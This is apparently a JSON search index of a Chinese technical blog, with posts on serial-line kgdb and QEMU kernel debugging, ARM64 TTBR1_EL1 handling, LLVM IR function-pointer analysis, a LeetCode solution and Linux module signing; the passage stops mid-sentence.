[ { "title": "使用串口调试Linux内核", "url": "/_posts/%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/", "categories": "Linux, debug, gdb", "tags": "Linux, debug, gdb", "date": "2024-03-31 00:00:00 +0000", "snippet": "前置要求及环境配置被调试的主机安装待调试内核，称为target，另一台装有稳定的Linux内核，称为host。target主板上带有原生com口，不能使用USB转接；需要一台USB转串口母线，连接target串口和host本文使用的target架构为aarch64, 系统为openeuler，内核为Linux-5.10, host架构为x86-64, 系统为ubuntu 20.04，内核为L...", "content": "前置要求及环境配置被调试的主机安装待调试内核，称为target，另一台装有稳定的Linux内核，称为host。target主板上带有原生com口，不能使用USB转接；需要一台USB转串口母线，连接target串口和host本文使用的target架构为aarch64, 系统为openeuler，内核为Linux-5.10, host架构为x86-64, 系统为ubuntu 20.04，内核为Linux-5.4。但理论上本文所述的方法在Linux 5.x的发行版上是通用的。确定串口是否可用在target上安装minicom：sudo yum install minicom -y在target上，通过sudo minicom -D /dev/ttyAMA0启动，在host上监听/dev/ttyUSB0，可以接收到来自target minicom的输入，同理，在target上也可以收到host的输入，到这一步可以确认串口和串口线是没问题的，通过ctrl+A X 退出minicom。如何确定串口是/dev/ttyAMA0? 猜的，但是可以通过遍历/dev下的所有串口设备来验证。在windows上，可以使用uartAssist来监听串口。安装必备工具apt-get install gcc make libncurses5-dev openssl libssl-dev build-essential pkg-config libc6-dev bison flex libelf-dev调试内核target的参数设置 首先检查/proc/sys/kernel/sysrq，如果为0，则sysrq没有开启，后续在使用echo g触发sysrq时传递的信号将被忽略，需要将其修改为1：echo 1 &gt; /proc/sys/kernel/sysrq。 在target上进入kgdb模式： sudo suecho ttyAMA0,115200 &gt; /sys/module/kgdboc/parameters/kgdboc 在dmesg中可以看到输出为KGDB: Registered I/O driver kgdboc ，说明target的串口没有问题。 在target上使系统hang住，以在host上能够通过gdb连接并调试： echo g &gt; /proc/sysrq-trigger 此时可以看到：Entering kdb (current=0xffff00209622e040, pid 1716) on processor 5 due to Keyboard Entry[5]kdb&gt;host的环境准备 在host上准备内核调试环境，包括gdb、target上使用的vmlinux以及相应的ko文件。由于我们的host与target架构不同，因此需要使用gdb-multiarch并显式设置architecture为aarch64，而非gdb。 在host上安装agent-proxy，作用是将串口分割为多个功能，这里使用host的5550和5551端口，其中5550用于连接target的console，5551用于连接target的kgdb监听端口 git clone http://git.kernel.org/pub/scm/utils/kernel/kgdb/agent-proxy.gitcd agent-proxy;makesudo ./agent-proxy 5550^5551 0 /dev/ttyUSB0,115200 在host上连接target的console： sudo telnet localhost 5550 在host上启动gdb-multiarch并连接5551端口: gdb-multiarch vmlinuxtarget remote:5551 发现连接失败并报错：gef&gt; target remote:5551Remote debugging using :5551Ignoring packet error, continuing...Remote replied unexpectedly to 'vMustReplyEmpty': vMustReplyEmpty同时，target上报错：[5]kdb&gt; g+$qSupporteddiag: -22: Permission denied原因是因为access to debugger functions is prohibited by default in you kernel，有两种解决方案： 将cmd_enable设置为1，当前可用，但系统重启后失效 echo 1 &gt; /sys/module/kdb/parameters/cmd_enable 添加一个启动参数，系统重启后生效： kdb.cmd_enable=1 在target的kdb console中输入go使系统退出此状态，进行上述修改后重新echo g &gt; /proc/sysrq-trigger，再次使用gdb连接target。在gdb上执行：set architecture aarch64参数可以在set architecture中找到，但是这里设置arm-v8a会有问题，原因未知。然后就可以愉快的进入调试了，后续的调试过程与qemu上基本相同，不再赘述。将输出重定向到串口经过上述操作后，连接5550端口的terminal输出为乱码，而target的系统日志默认输出到屏幕，导致panic时无法查看现场和之前的printk输出，因此需要使屏幕输出重定向到串口。通过修改/etc/default/grub，在GRUB_CMDLINE_LINUX即Linux的启动参数中添加console=ttyAMA0,115200，使系统日志同时输出到屏幕和串口。重新生成grub.cfg：sudo grub2-mkconfig -o /boot/efi/EFI/openEuler/grub.cfg，重启后，即可在串口看到输出的系统日志。目前暂未解决的问题 无法在gdb-multiarch中查看系统寄存器如TTBR1_EL1、TCR_EL1等的信息，暂不清楚是gdb-multiarch的限制还是串口的限制。 无法像在qemu中一样在gdb一侧使整个内核挂起，目前只能在target一侧通过echo g &gt; /proc/sysrq-trigger来挂起内核。 References 【1】Using kgdb, kdb and the kernel debugger internals — The Linux Kernel documentation " }, { "title": "使用qemu进行Linux内核调试", "url": "/_posts/%E4%BD%BF%E7%94%A8qemu%E8%BF%9B%E8%A1%8CLinux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/", "categories": "Linux, debug, gdb", "tags": "Linux, debug, gdb", "date": "2023-09-11 00:00:00 +0000", "snippet": " 一篇创建于2023.9.11，完成于2024.3.31，拖了大半年的文章调试前的准备编译qemu在ubuntu中可以通过apt安装qemu-system，也可以从源码自行编译。在编译qemu-8.0时，可能遇到kvm Parameter 'type' expects a netdev backend type，原因是因为在编译时没有enable-slirp，而enable_slirp需要...", "content": " 一篇创建于2023.9.11，完成于2024.3.31，拖了大半年的文章调试前的准备编译qemu在ubuntu中可以通过apt安装qemu-system，也可以从源码自行编译。在编译qemu-8.0时，可能遇到kvm Parameter 'type' expects a netdev backend type，原因是因为在编译时没有enable-slirp，而enable_slirp需要安装相应的依赖，完整的命令如下：sudo apt-get install libslirpsudo apt-get install libglib2.0-devcd qemu-8.0./configure -enable-slirpmake编译内核想必大家都会，略过不提编译磁盘镜像qemu可以使用多种格式的磁盘镜像，在qemu的文档中给出了一些创建文件系统的方式：Disk Images — QEMU documentation (qemu-project.gitlab.io)个人比较喜欢通过两种方式创建磁盘镜像： 利用syzkaller的create-image.sh：syzkaller/tools/create-image.sh at master · google/syzkaller (github.com) 编译busybox：Qemu 模拟环境 - CTF Wiki (ctf-wiki.org)前者的好处是创建的磁盘镜像比较完整，比较方便安装各种工具、与宿主机进行各种交互，而后者的好处是比较轻量，只有一个init进程，可以避免多余进程的干扰。可以根据自己需求自行选择。启动内核常用的启动命令：sudo qemu-system-aarch64 -M virt -machine gic-version=3 \\-enable-kvm -cpu host -nographic -smp 8 -drive \\file=/path/to/jammy.img,format=raw \\-kernel /path/to/arch/arm64/boot/Image \\-append \"nokaslr console=ttyAMA0 root=/dev/vda oops=panic panic_on_warn=1 panic=-1 ftrace_dump_on_oops=orig_cpu debug earlyprintk=serial net.ifnames=0 slub_debug=UZ\" -m 8G -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10024-:22 -net nic -S -gdb tcp::4321 -no-reboot对其中各个参数的解释： enable-kvm可以使虚拟机获得接近于真机的性能，并且如果使用-cpu host使用宿主机cpu的硬件特性，则必须开启kvm。开启kvm后可能对调试过程产生干扰，即在使用gdb单步调试时常常陷入中断，目前存在几种办法来避免该问题： 在单步的下一条指令处打断点，直接跳到下一条指令，忽略中间的中断处理 在要调试的代码前后关闭中断 关闭kvm，并在qemu-system-aarch64 –machine help列出的qemu所支持的cpu中选择合适的替换-cpu host -append后面是内核的启动参数，具体可以参阅内核文档https://docs.kernel.org/admin-guide/kernel-parameters.html -net后面是对qemu的网络设置，为了使该设置生效，在编译内核时需要将网卡驱动编译进内核，即将CONFIG_E100、CONFIG_E1000、CONFIG_E1000E设置为y -gdb表示可以通过gdb连接该端口实现远程调试，-S表示需要等待gdb连接后内核才能正常启动 -no-reboot表示内核关机后自动重启 其他需要的参数可以自行参阅文档，按需使用调试内核调试内核的启动过程在调试正常启动后的内核时使用的gdb命令与调试普通的用户态进程并没有什么太大的区别，然而在调试内核的启动过程时，发现内核中head.S打不上断点，究其原因在于内核启动时在__enable_mmu前尚未开启mmu，运行时使用的.text段、.init.text段和.rodata等段的位置与开启mmu和分页后使用的地址不一致，也就导致gdb插入stub的地址与内核实际执行的指令的地址不一致，因此需要通过add-symbol-file手动指定内核中各个段的位置，以使gdb能够正确添加断点。首先使用qemu启动内核，在gdb中连接虚拟机：(gdb) target remote:4321Remote debugging using:43210x0000000040000000 in ??()我们查看此时的前32条指令，得到：前几条指令是qemu为了引导内核启动加入的代码， 首先将0x40200000加载到x4寄存器中，然后通过br x4跳转到0x40200000位置。查看该位置的代码，得到：对应地，查看head.S的代码，有：_head:\t/*\t * DO NOT MODIFY. Image header expected by Linux boot-loaders.\t */#ifdef CONFIG_EFI\t/*\t * This add instruction has no meaningful effect except that\t * its opcode forms the magic \"MZ\" signature required by UEFI.\t */\tadd\tx13, x18, #0x16\tb\tprimary_entry#else\tb\tprimary_entry\t\t\t// branch to kernel start, magic\t.long\t0\t\t\t\t// reserved#endif\t.quad\t0\t\t\t\t// Image load offset from start of RAM, little-endian\tle64sym\t_kernel_size_le\t\t\t// Effective size of kernel image, little-endian\tle64sym\t_kernel_flags_le\t\t// Informative flags, little-endian\t.quad\t0\t\t\t\t// reserved\t.quad\t0\t\t\t\t// reserved\t.quad\t0\t\t\t\t// reserved\t.ascii\tARM64_IMAGE_MAGIC\t\t// Magic number#ifdef CONFIG_EFI\t.long\tpe_header - _head\t\t// Offset to the PE header.二者刚好对应，因此，内核在qemu上的加载基地址为0x40200000。我们通过readelf查看vmlinux的段偏移：可以得到.text相对于.head.text的偏移为0x10000,.rodata相对于.head.text的段偏移为0xe70000，.init.text相对于.head.text的偏移为0x15d0000，因此可以得到加载时内核各个段在内存中的地址，据此通过add-symbol-file对MMU开启前的section进行符号表的修改：add-symbol-file vmlinux -s .head.text 0x40200000 -s .text 0x40210000 -s .rodata 0x41170000 -s .init.text 0x417d0000调试动态插入内核的kernel module由于动态插入的kernel module在编译时并没有编入vmlinux，并且在kernel module插入内核时其内存地址是动态分配的，因此gdb无法通过读取vmlinux找到相应的符号，也无法静态地确定kernel module在内存中的位置从而也就无法在相应的函数上打断点。在kernel module插入内核后，内核会为每个kernel module创建一个kobject，并在sysfs伪文件系统下创建相应的文件用于导出其数据和属性到用户空间，为用户提供对这些数据和属性的访问支持。以dm_mirror为例，在/sys/module/dm_mirror/sections中，存在如下文件：其中.text、.data、.rodata等分别代表着dm_mirror中相应的段在内核中的地址：在gdb中，同样使用add-symbol-file来指定ko段在内核中的地址，使gdb能够得到各个符号的位置和相应的描述，即可成功插入断点，实现对kernel module的调试：add-symbol-file /path/to/dm_mirror.ko -s .text address" }, { "title": "Linux下的TTBR1_EL1寄存器使用探究", "url": "/_posts/Linux-TTBR1/", "categories": "operating system, Linux", "tags": "Linux", "date": "2023-08-14 00:00:00 +0000", "snippet": " 本文分析基于Linux-5.10.100，架构基于ARM64 V8.3，假设页表映射层级为4，即CONFIG_ARM64_PGTABLE_LEVELS=4，地址宽度为48，即CONFIG_ARM64_VA_BITS=48。在Linux系统中，通过MMU进行虚实地址转换时，会依赖于TTBR1_EL1和TTBR0_EL0两个寄存器。其中TTBR1_EL1指向内核地址空间的页表基地址，TTBR...", "content": " 本文分析基于Linux-5.10.100，架构基于ARM64 V8.3，假设页表映射层级为4，即CONFIG_ARM64_PGTABLE_LEVELS=4，地址宽度为48，即CONFIG_ARM64_VA_BITS=48。在Linux系统中，通过MMU进行虚实地址转换时，会依赖于TTBR1_EL1和TTBR0_EL0两个寄存器。其中TTBR1_EL1指向内核地址空间的页表基地址，TTBR0_EL0指向用户地址空间的页表基地址。Linux中所有内核线程共享内核地址空间，因此TTBR1_EL1中的值为swapper_pg_dir, swapper_pg_dir在arm64/include/asm/pgtable.h中的定义为：extern pgd_t swapper_pg_dir[PTRS_PER_PGD];在使用有效虚拟地址长度为48位，四级页表映射（CONFIG_PGTABLE_LEVELS=4）的情况下，PTRS_PER_PGD为512，即pgd表项共512项。swapper_pg_dir挂载在内核线程共用的mm_struct init_mm中：struct mm_struct init_mm = {\t.mm_rb\t\t= RB_ROOT,\t.pgd\t\t= swapper_pg_dir,\t.mm_users\t= ATOMIC_INIT(2),\t.mm_count\t= ATOMIC_INIT(1),\tMMAP_LOCK_INITIALIZER(init_mm)\t.page_table_lock = __SPIN_LOCK_UNLOCKED(init_mm.page_table_lock),\t.arg_lock\t= __SPIN_LOCK_UNLOCKED(init_mm.arg_lock),\t.mmlist\t\t= LIST_HEAD_INIT(init_mm.mmlist),\t.user_ns\t= &amp;init_user_ns,\t.cpu_bitmap\t= CPU_BITS_NONE,\tINIT_MM_CONTEXT(init_mm)};进程地址空间相互隔离，因此TTBR0_EL0中的值为每个进程独有的，在进程描述符task_struct中存在对内存地址空间的定义：struct task_struct { ... struct mm_struct *mm; struct mm_struct *active_mm; ...}其中对于用户进程来说，mm和active_mm均指向其用户地址空间，而对于内核线程，mm为NULL，active_mm指向其借用的那个进程的进程地址空间。地址空间的页表基址定义在mm_struct中：struct mm_struct { \t... \tpgd_t * pgd; ...};在进程切换时，将task_struct-&gt;mm-&gt;pgd加载到TTBR0_EL0中以实现对进程地址空间的切换。TTBR1寄存器的变化在内核启动过程中，首先实现的是内核的恒等映射，内核此时使用的是一级页表init_idmap_pg_dir，放在TTBR0寄存器中，TTBR1寄存器中保存的是空白页表reserved_pg_dir，将整个kernel、FDT以及预留的swap区域的虚拟地址连续映射到相等的物理地址处，此处的内核仅具备读、执行权限。随后，将设置好的页表init_pg_dir放入TTBR1寄存器，将page walk使用的寄存器由TTBR0转换为TTBR1，代码开始在EL1区域内运行。最后，通过paging_init实现页初始化，将swapper_pg_dir加载到TTBR1寄存器并且使用swapper_pg_dir替换init_mm的pgd：void __init paging_init(void){\t...\tcpu_replace_ttbr1(lm_alias(swapper_pg_dir));\tinit_mm.pgd = swapper_pg_dir;\t...}Arm64支持ASID(Address Space ID)，为每个进程分配一个ASID，标识自己的进程地址空间，以避免在进程切换时刷新TLB，性能。TLB entry的ASID来自于TTBRx_EL1寄存器，在TLB block在缓存的同时，将当前进程的ASID缓存到对应的TLB entry中。在进程运行的过程中，TTBR1寄存器的高位会加入当前进程的ASID的信息，验证代码如下：static void switch_ttbr1() {\tunsigned long orig_ttbr1; asm volatile(\t\t\"\tmrs %0, ttbr1_el1\\n\"\t\t\"\tmsr ttbr1_el1, %0\\n\"\t\t: \"=r\"(orig_ttbr1)\t\t: \t);\tprintk(\"ttbr1_el1: 0x%llx\\n\", orig_ttbr1);\tpgd_t *pgdp = lm_alias(swapper_pg_dir);\tphys_addr_t ttbr1 = phys_to_ttbr(virt_to_phys(pgdp));\tif (system_supports_cnp() &amp;&amp; !WARN_ON(pgdp != lm_alias(swapper_pg_dir)))\t\tttbr1 |= TTBR_CNP_BIT;\tunsigned long asid = ASID(current-&gt;active_mm);\tttbr1 &amp;= ~TTBR_ASID_MASK;\tttbr1 |= FIELD_PREP(TTBR_ASID_MASK, asid);\tprintk(\"ttbr1 with ASID: 0x%llx\\n\", ttbr1);\twrite_sysreg(ttbr1, ttbr1_el1);\tisb();\tpost_ttbr_update_workaround();}通过qemu启动内核，触发上述代码，通过dmesg查看得到：其中swapper_pg_dir所对应的物理地址为0x0000417e2001，而该内核线程对应进程的ASID为0x0344，二者或运算得到完整的TTBR1_EL1寄存器的值。" }, { "title": "如何基于LLVM IR分析全局函数指针的使用情况", "url": "/_posts/%E5%9F%BA%E4%BA%8ELLVM-IR%E5%88%86%E6%9E%90%E5%85%A8%E5%B1%80%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E5%9C%A8%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E6%83%85%E5%86%B5/", "categories": "程序分析, LLVM", "tags": "程序分析, LLVM", "date": "2023-06-23 00:00:00 +0000", "snippet": "内核中的全局函数指针大致可以分为两种：一种是全局变量本身是一个函数指针，另一种是全局结构体的某个子域是函数指针，例如：struct funcptr {\tvoid (*foo)();}s;void (*fp)(void);而对这些函数指针的调用，反映到IR上，通常为：fp(): store void ()* @indirect, void ()** @fp, align 8 %8 = lo...", "content": "内核中的全局函数指针大致可以分为两种：一种是全局变量本身是一个函数指针，另一种是全局结构体的某个子域是函数指针，例如：struct funcptr {\tvoid (*foo)();}s;void (*fp)(void);而对这些函数指针的调用，反映到IR上，通常为：fp(): store void ()* @indirect, void ()** @fp, align 8 %8 = load void ()*, void ()** @fp, align 8 call void %8()s.foo(): %9 = load void (...)*, void (...)** getelementptr inbounds (%struct.funcptr, %struct.funcptr* @s, i32 0, i32 0), align 8 %10 = bitcast void (...)* %9 to void ()* call void %10()我们可以根据IR的特征来找到对于这些全局变量的使用情况。如何识别函数指针LLVM IR对于全局变量和栈上的变量处理是类似的，都将其看作指针。也就是说，即使对于一个int类型的全局变量a，直接访问其type也是指针类型。例如：C-Level:\tint a = 0;IR：\t@a = dso_local global i32 0, align 4Type:\ti32*因此，对于所有的全局变量，只有通过gv.getType()-&gt;getPointerElementType()才能得到真正的类型，再在这个类型的基础上对该变量的类型进行分类。函数指针首先其本身类型为Pointer，其PointerElementType为Function。而对于结构体，或结构体类型的指针，需要对其类型进行一个类BFS的算法，如果类型为Pointer，则对其PointerElementType进行判断，如果该类型为Struct/Array，再依次判断Struct的字段类型或Array中的元素类型，对应地有如下代码：bool hasFuncptr(llvm::Type *type, llvm::GlobalVariable *gv){ assert(isa&lt;ArrayType&gt;(type) || isa&lt;StructType&gt;(type)); assert(gv != nullptr); if (isa&lt;ArrayType&gt;(type)) { if (gv-&gt;hasInitializer()) if (isa&lt;FunctionType&gt;(type-&gt;getArrayElementType())) return true; } else if (isa&lt;StructType&gt;(type)) { queue&lt;llvm::Type *&gt; que; que.push(type); set&lt;llvm::Type *&gt; typeset; while (!que.empty()) { llvm::Type *cur = que.front(); que.pop(); if (typeset.find(cur) != typeset.end()) continue; else typeset.insert(cur); if (isa&lt;PointerType&gt;(cur)) { if (isa&lt;FunctionType&gt;(cur-&gt;getPointerElementType())) { return true; } else que.push(cur-&gt;getPointerElementType()); } else if (isa&lt;StructType&gt;(cur)) { if (gv-&gt;hasInitializer()) { for (int i = 0; i &lt; cur-&gt;getStructNumElements(); i++) { que.push(cur-&gt;getStructElementType(i)); } } } else if (isa&lt;ArrayType&gt;(cur)) { if (gv-&gt;hasInitializer()) que.push(cur-&gt;getArrayElementType()); } else continue; } } return false;}void check_type(llvm::Module *module){ for (auto &amp;gv : module-&gt;getGlobalList()) { Type *type = gv.getType()-&gt;getPointerElementType(); if (isa&lt;PointerType&gt;(type)) { if (isa&lt;FunctionType&gt;(type-&gt;getPointerElementType())) {\t // 说明是函数指针 } else { while (isa&lt;PointerType&gt;(type)) {\t // 指针指向指针，继续判断 type = type-&gt;getPointerElementType(); } if (isa&lt;StructType&gt;(type) || isa&lt;ArrayType&gt;(type)) {\t // 结构体或数组 if (hasFuncptr(type, &amp;gv)) // 子域中存在函数指针 } else {\t // 其他类型，必不可能包含函数指针 } } } else if (isa&lt;StructType&gt;(type) || isa&lt;ArrayType&gt;(type)) { // 全局变量本身是结构体或数组 if (hasFuncptr(type, &amp;gv))\t //子域中存在函数指针 } else { // 普通数据，必不包含函数指针 } }}如何追踪函数指针的调用对于llvm::Value，可以通过users()找到该变量的所有use点，例如下面这段代码就构成了对fp的一条def-use链：@fp = common dso_local global void ()* null, align 8%4 = load void ()*, void ()** @fp, align 8call void %4()从上面这段IR，我们似乎可以得到一个非常简单的判断方式：从已经判定为指针类型的全局变量开始，顺着def-use链进行DFS，遇到call指令之后检查其是否是间接调用，如果是间接调用，则说明调用了这个函数指针。然而，上述方法在很大程度上会存在误报和漏报的现象： 当这个函数指针作为另一个间接调用的参数时，沿着def-use链依然会出现间接调用，但是实际上调用的并不是这个函数指针，从而会出现误报。 当某个结构体的子域是函数指针时，这个结构体的另一个子域作为作为另一个间接调用的参数，沿着def-use链依然会出现间接调用，但是调用的并不是作为函数指针的这个子域，从而会出现误报 当函数指针作为函数调用参数时，在callee中通过该参数调用而不是通过该全局变量调用，由于这个参数并不在该全局变量的def-use链上，因此无法将该调用关联到该全局变量本身，从而会出现漏报。例如：C-Level:void (*fp)(void);void test(void (*funcptr)(void)) { funcptr();}void (*ffp)(void (*)(void));int main() { ffp = test; test(fp); ffp(fp);}IR：@ffp = common dso_local global void (void ()*)* null, align 8@fp = common dso_local global void ()* null, align 8; Function Attrs: noinline nounwind optnonedefine dso_local void @test(void ()* %0) #0 { %2 = alloca void ()*, align 8 store void ()* %0, void ()** %2, align 8 %3 = load void ()*, void ()** %2, align 8 call void %3() ret void}; Function Attrs: noinline nounwind optnonedefine dso_local i32 @main() #0 { store void (void ()*)* @test, void (void ()*)** @ffp, align 8 %1 = load void ()*, void ()** @fp, align 8 call void @test(void ()* %1) %2 = load void (void ()*)*, void (void ()*)** @ffp, align 8 %3 = load void ()*, void ()** @fp, align 8 call void %2(void ()* %3) ret i32 0}那么fp的def-use链为@fp = common dso_local global void ()* null, align 8%1 = load void ()*, void ()** @fp, align 8call void @test(void ()* %1)@fp = common dso_local global void ()* null, align 8%3 = load void ()*, void ()** @fp, align 8call void %2(void ()* %3)对于第一种情况，我们可以通过判断间接调用的calledOperand是否在def-use链上，如果在，那么说明实际调用的很可能就是追踪的这个全局指针。如果不在，那么这个全局变量可能就是作为参数被用于该call指令。对于第二种情况，也是同样的道理。如果调用的是该全局变量的某个子域，那么在def-use 链上一定存在一条getElementptr指令，将该结构体的子域加载到某个临时变量，随后call该临时变量。而如果只是将全局变量的某个子域作为函数参数传递，那么calledOperand必然不会在def-use链上，所以也不会关联到对该全局变量的调用。分析代码如下：void checkUsepoint(llvm::Module *module){ for (auto &amp;gv : module-&gt;getGlobalList()) { std::string gv_name = gv.getName().str(); std::set&lt;llvm::Value *&gt; def_chain; queue&lt;llvm::Value *&gt; que; que.push(&amp;gv); def_chain.insert(&amp;gv); while (!que.empty()) { llvm::Value *cur = que.front(); que.pop(); for (auto user : cur-&gt;users()) { if (CallInst *call = dyn_cast&lt;CallInst&gt;(user)) { if (call-&gt;isIndirectCall()) { auto called_operand = call-&gt;getCalledOperand(); if (def_chain.find(called_operand) != def_chain.end()) { // 出现了对该全局变量的调用 } } } que.push(user); def_chain.insert(user); } } }}对于第三种情况：除了main函数中对全局变量的调用之外，test函数中的call void %3()实际上也是调用的全局函数指针fp，但是由于数据流的断裂，上述分析方案无法追踪到该调用。那么如何在过程间重建数据流呢？对于不具有可变参数的函数，我们可以根据参数的下标，找到函数形参列表中与该下标对应的下标。例如，全局变量fp的use链上的call void @test(void ()* %1)这条指令，其参数%1在fp的use链上，对应的下标为0，那么根据calledFunction找到test这个函数，通过getArg(0)找到参数列表中的void ()* %0，再在函数test中对%0进行追踪。然而，从%0无法通过 def-use链找到call void %3()这条指令，因为%3与%0实际上是别名关系，其所在的def-use链为： %2 = alloca void ()*, align 8 %3 = load void ()*, void ()** %2, align 8 call void %3()因此这种情况需要辅以别名分析，找到该函数内部该参数的别名，对这些别名追踪其use点是否存在间接调用。上述方法只对direct Call有效，因为对于间接调用，其calledFunction返回为nullptr。根据c++ - How can I get Function Name of indirect call from CallInst in LLVM - Stack Overflow，对于间接调用无法直接获得其对应的函数。KSplit中对于间接调用是通过匹配callsite与每个函数的参数列表和返回值类型，如果能够对应，则将该函数认为是callsite的candidate，随后再对每个candidate进行分析。然而此方法会得到的分析结果最终是overapproximate的，并且开销过高，并不适用。" }, { "title": "LeetCode 11. 盛最多水的容器", "url": "/_posts/11.-%E7%9B%9B%E6%9C%80%E5%A4%9A%E6%B0%B4%E7%9A%84%E5%AE%B9%E5%99%A8/", "categories": "Leetcode, algorithm", "tags": "C/C++, LeetCode, algorithm", "date": "2023-06-04 00:00:00 +0000", "snippet": " 迫于最近比较无聊，重操Leetcode旧业，顺带写一下题解。题目描述给定一个长度为 n 的整数数组 height 。有 n 条垂线，第 i 条线的两个端点是 (i, 0) 和 (i, height[i]) 。找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。返回容器可以储存的最大水量。说明：你不能倾斜容器。示例： 输入：[1,8,6,2,5,4,8,3,7]输出：49 ...", "content": " 迫于最近比较无聊，重操Leetcode旧业，顺带写一下题解。题目描述给定一个长度为 n 的整数数组 height 。有 n 条垂线，第 i 条线的两个端点是 (i, 0) 和 (i, height[i]) 。找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。返回容器可以储存的最大水量。说明：你不能倾斜容器。示例： 输入：[1,8,6,2,5,4,8,3,7]输出：49 解释：图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为 49。解法一首先最简单的思路是直接暴力枚举，依次取两条线计算其储水量，取其中的最大值作为结果。代码如下：class Solution {public: int maxArea(vector&lt;int&gt;&amp; height) { int res = 0; for (int i = 0; i &lt; height.size() - 1; i++) { for (int j = height.size() - 1; j &gt; i; j--) { int cur = min(height[i], height[j]) * (j - i); if (cur &gt; res) res = cur; } } return res; }};很显然上述代码的时间复杂度为O(n^2)，超出时间限制，需要进行优化。解法二我们仔细观察题目的示例，每个容器的容量应该是min(左侧高度, 右侧高度)*二者之间的距离，那么在上面进行暴力枚举的时候，有些计算是不必要的。例如，当选定左侧高度为1时，那么无论右侧高度为多少，最后容器的有效高度都只有1，那么只有当右侧高度为7时容器的容量才会最大，因为此时容器的长度最长。因此我们可以有如下代码：class Solution {public: int maxArea(vector&lt;int&gt;&amp; height) { int res = 0; for (int i = 0; i &lt; height.size() - 1; i++) { for (int j = height.size() - 1; j &gt; i; j--) { int cur = min(height[i], height[j]) * (j - i); if (cur &gt; res) res = cur; if (height[i] &lt; height[j]) break; } } return res; }};这样最坏情况下，时间复杂度依然为O(n^2)，最坏情况为线的高度倒序排列，对每个i，都需要依次遍历一遍j。运行发现可以通过，但是运行时间为1148ms，仅超过5.60%，仍有优化空间。解法三当height[i] &lt; height[j]时，i直接+1，因为无论后续j如何变化，总的高度不会超过height[i]res = min(height[i], height[j]) * (j - i + 1).当height[i] &lt; height[j]时，随着j减小，在i保持不变时，res' &lt; height[i] * (j - i + 1)，因此可以省略掉对j的后续遍历，直接i + 1，重新开始计算。而当height[i] &gt; height[j]时，同样的道理，在j保持不变时，随着i增大，res' &lt; height[j] * (j - i + 1)，因此可以省略掉对i的后续遍历，直接j - 1，重新开始计算。而我们的上述代码的问题在于，对于每个新的i，都从height的末尾重新遍历j，导致多了很多不必要的计算。将两部分结合起来，得到： 当height[i] &gt; height[j]时，j--； 当height[i] &lt; height[j]时，i++。 当height[i] = height[j]时，如果在i和j之间不存在更大的height，那么i++或者j–对容量无影响。如果在i和j之间存在更大的height，那么会存在两种情况： 存在i &lt; m &lt; j，m唯一，且height[m] &gt; height[i] = height[j]，此时最大容量仍由i, j 决定，与m无关，因此i + 1或j - 1对结果无影响。 存在i &lt; m &lt; n &lt; j, 且height[m] &gt; height[n] &gt; height[i] = height[j]，此时最大容量取决于height[n] * (m - n + 1)与height[i] *(i - j + 1)的大小，同样i + 1或j - 1对结果无影响。 存在i &lt; m &lt; n &lt; j, 且height[n] &gt; height[m] &gt; height[i] = height[j]，此时与上述2.相同.综上，得到最终优化后的代码如下： class Solution{public: int maxArea(vector&lt;int&gt; &amp;height) { int i = 0; int res = 0; for (int i = 0, j = height.size() - 1; i &lt; j; ) { int cur = min(height[i], height[j]) * (j - i); if (cur &gt; res) res = cur; if (height[i] &lt;= height[j]) i++; else j--; } return res; }}; 每个height仅遍历一次，时间复杂度为O(n)。运行时间68ms，击败82.8%。" }, { "title": "Linux内核模块签名与版本检查机制", "url": "/_posts/Linux%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%AD%BE%E5%90%8D%E4%B8%8E%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/", "categories": "operating system, Linux", "tags": "operating system, Linux", "date": "2023-05-12 00:00:00 +0000", "snippet": "内核模块签名机制linux内核从3.7 开始加入模块签名检查机制， 校验签名是否与已编译的内核公钥匹配。目前只支持RSA X.509验证， 模块签名验证并非强制使用， 可在编译内核时配置是否开启。CONFIG_MODULE_SIG: Module signature verification开启该选项后，内核加载该模块时会对内核模块的签名进行检查。默认情况下，在加载没有签名或签名不正确的内核...", "content": "内核模块签名机制linux内核从3.7 开始加入模块签名检查机制， 校验签名是否与已编译的内核公钥匹配。目前只支持RSA X.509验证， 模块签名验证并非强制使用， 可在编译内核时配置是否开启。CONFIG_MODULE_SIG: Module signature verification开启该选项后，内核加载该模块时会对内核模块的签名进行检查。默认情况下，在加载没有签名或签名不正确的内核模块时，仅打印一条提示信息，将内核标记为tainted，然后继续加载该模块。CONFIG_MODULE_SIG_FORCE: Require modules to be validly signed开启该选项后，在加载无签名或签名不正确的内核模块时，内核会直接拒绝加载签名有问题的内核模块。CONFIG_MODULE_SIG_ALL: Automatically sign all moduleskbuild在执行make modules_install时对所有的内核模块进行签名，若该选项未设置，则需要手动调用scripts/sign-file对内核模块进行签名CONFIG_MODULE_SIG_HASH: 设置签名算法包括： CONFIG_MODULE_SIG_SHA1：sha1 CONFIG_MODULE_SIG_SHA224：sha224 CONFIG_MODULE_SIG_SHA256：sha256 CONFIG_MODULE_SIG_SHA384：sha384 CONFIG_MODULE_SIG_SHA512：sha512内核和驱动中的版本信息Linux的内核版本号KERNELRELEASE在编译的过程中生成，存储在include/config/kernel.release文件中。vermagic用于内核模块的版本检查，Linux内核的vermagic可以通过cat /proc/version来查看，而对于kernel module，可以通过modinfo来查看。其值由kernel Makefile中的VERMAGIC_STRING表示，其中UTS_RELEASE即为内核的KERNELRELEASE。：VERMAGIC_STRING = \t&lt;UTS_RELEASE&gt; [\"SMP\"] [\"preempt\"] [\"mod_unload\"][\"modversions\"]为了确保Linux kernel和kernel 